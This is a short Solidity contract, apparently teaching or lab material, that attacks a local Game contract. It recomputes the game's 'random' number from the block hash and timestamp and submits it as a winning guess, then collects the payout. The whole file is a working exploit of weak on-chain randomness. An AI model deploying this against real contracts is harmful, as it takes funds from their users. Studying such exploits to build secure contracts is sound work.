// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// import game contract
import "./Game.sol";

contract Attack {
    Game s_game;

    // Constructor
    constructor(address _gameAddress) {
        s_game = Game(_gameAddress);
    }

    // Attack function
    function attack() public {
        uint256 guess_param = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        s_game.guess(guess_param);
    }

    receive() external payable {}
}
